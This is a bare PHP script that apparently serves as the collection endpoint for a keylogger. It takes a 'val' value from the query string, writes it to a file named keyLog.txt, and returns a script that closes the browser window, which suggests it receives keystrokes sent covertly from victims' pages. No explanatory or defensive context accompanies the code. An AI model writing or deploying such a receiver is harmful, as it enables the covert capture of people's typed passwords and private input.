<?php
function write($val){
	$file = 'keyLog.txt';
	file_put_contents($file, $val);
}
if(isset($_GET['val'])){
    write($_GET['val']);
 }
 echo "<script>window.close();</script>";
?>